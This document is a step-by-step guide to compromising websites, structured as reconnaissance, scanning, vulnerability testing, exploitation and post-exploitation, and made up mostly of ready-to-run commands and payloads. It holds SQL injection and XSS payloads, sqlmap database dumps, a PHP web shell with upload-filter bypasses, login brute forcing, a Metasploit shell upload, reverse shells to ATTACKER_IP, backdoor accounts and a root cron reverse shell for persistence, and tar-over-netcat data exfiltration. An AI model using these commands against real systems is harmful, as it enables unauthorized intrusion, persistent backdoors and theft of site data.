How Hackers Compromise Websites

The Hacker Methodology: Five Core Phases

Reconnaissance (Information Gathering)

Scanning & Enumeration

Vulnerability Assessment

Exploitation

Post-Exploitation & Persistence

Each phase builds on the previous one, following a structured and methodical approach.



PHASE 1: ReconnaISSANCE (Information Gathering)

Objective: Collect as much information as possible about the target without triggering alerts.

A. Passive Reconnaissance (No Direct Interaction)

1. WHOIS Lookup

whois example.com 

Information obtained:

Domain registrar

Registration and expiration dates

Name servers

Registrant contact information



2. DNS Enumeration

dig example.com ANY dig example.com AXFR dig example.com MX dig example.com NS 

Used to identify DNS records, subdomains, mail servers, and name servers.



3. Google Dorking (Advanced Search Queries)

site:example.com filetype:pdf site:example.com inurl:admin site:example.com intext:"password" site:example.com ext:sql site:example.com intitle:"index of" site:example.com inurl:login 

Helps locate exposed files, login pages, and sensitive information indexed by search engines.



4. Subdomain Enumeration

sublist3r -d example.com amass enum -d example.com 

Web-based alternative:

https://dnsdumpster.com



5. Technology Detection

whatweb example.com 

Other tools:

Wappalyzer

BuiltWith (https://builtwith.com)

Identifies web server, frameworks, CMS, and backend technologies.



6. Wayback Machine

https://web.archive.org

Used to review historical versions of the website and uncover removed or forgotten pages.



7. Social Media & Employee Information

Sources include:

LinkedIn

GitHub

Pastebin

Automated tool:

theHarvester -d example.com -b all 



PHASE 2: SCANNING & ENUMERATION

Objective: Identify live hosts, open ports, and running services.



A. Network Scanning

1. Ping Sweep

ping -c 4 example.com nmap -sn 192.168.1.0/24 



2. Port Scanning with Nmap

nmap example.com nmap -p- example.com nmap -sV example.com nmap -O example.com nmap -A example.com nmap -p 80,443,22,21,3306 example.com sudo nmap -sS example.com sudo nmap -sU example.com 



3. Service Enumeration

HTTP/HTTPS

curl -I http://example.com nmap --script http-methods example.com dirb http://example.com gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/common.txt 

SSH

nmap --script ssh-auth-methods example.com 

FTP

nmap --script ftp-anon example.com 

MySQL

nmap --script mysql-info example.com 



B. Web Application Scanning

1. Directory & File Enumeration

gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dirb http://example.com ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt python3 dirsearch.py -u http://example.com 

Common discoveries:

/admin

/login

/phpmyadmin

/backup

/config

/uploads

/api



2. Web Vulnerability Scanning

nikto -h http://example.com wpscan --url http://example.com --enumerate u,p,t nuclei -u http://example.com 



PHASE 3: VULNERABILITY ASSESSMENT

Objective: Identify exploitable weaknesses.



A. Manual Testing

1. SQL Injection Testing

http://example.com/product.php?id=1' http://example.com/product.php?id=1' UNION SELECT NULL,NULL,NULL-- http://example.com/product.php?id=1' AND SLEEP(5)-- 

Using SQLmap:

sqlmap -u "http://example.com/product.php?id=1" --dbs sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables sqlmap -u "http://example.com/product.php?id=1" -D database_name -T users --dump 



2. Cross-Site Scripting (XSS)

<script>alert('XSS')</script> <img src=x onerror=alert('XSS')> <svg onload=alert('XSS')> 



3. File Upload Vulnerabilities

<?php system($_GET['cmd']); ?> 

Bypass techniques:

shell.php.jpg

shell.php%00.jpg

shell.phtml

shell.php5



4. Authentication Bypass

Default credentials:

admin:admin admin:password root:root 

SQL injection login:

Username: admin' OR '1'='1 Password: anything 

Brute force:

hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" 



PHASE 4: EXPLOITATION

Objective: Gain unauthorized access.



A. SQL Injection Exploitation

sqlmap -u "http://example.com/product.php?id=1" --batch sqlmap -u "http://example.com/product.php?id=1" --dbs --batch sqlmap -u "http://example.com/product.php?id=1" -D shop_db --tables --batch sqlmap -u "http://example.com/product.php?id=1" -D shop_db -T users --dump --batch sqlmap -u "http://example.com/product.php?id=1" --os-shell 



B. File Upload Exploitation

Web shell:

<?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> 

Usage:
http://example.com/uploads/shell.php?cmd=whoami http://example.com/uploads/shell.php?cmd=ls -la http://example.com/uploads/shell.php?cmd=cat /etc/passwd 

Reverse shell:
nc -lvnp 4444 nc -e /bin/bash ATTACKER_IP 4444 

C. Known Vulnerabilities (Metasploit)
msfconsole search wordpress use exploit/unix/webapp/wp_admin_shell_upload set RHOSTS example.com set TARGETURI /wordpress set USERNAME admin set PASSWORD password123 exploit 

PHASE 5: POST-EXPLOITATION
Objective: Maintain access and extract data.

A. Privilege Escalation
whoami id sudo -l find / -perm -4000 2>/dev/null uname -a searchsploit linux kernel 4.4.0 

B. Maintaining Access
useradd -m -s /bin/bash hacker echo "hacker:password123" | chpasswd usermod -aG sudo hacker mkdir /root/.ssh echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" >> /var/spool/cron/crontabs/root 

C. Data Exfiltration
find / -name "*.conf" 2>/dev/null find / -name "config.php" 2>/dev/null find / -name "*.sql" 2>/dev/null mysqldump -u root -p database_name > dump.sql nc -lvnp 5555 > stolen_data.tar.gz tar -czf - /var/www/html | nc ATTACKER_IP 5555 




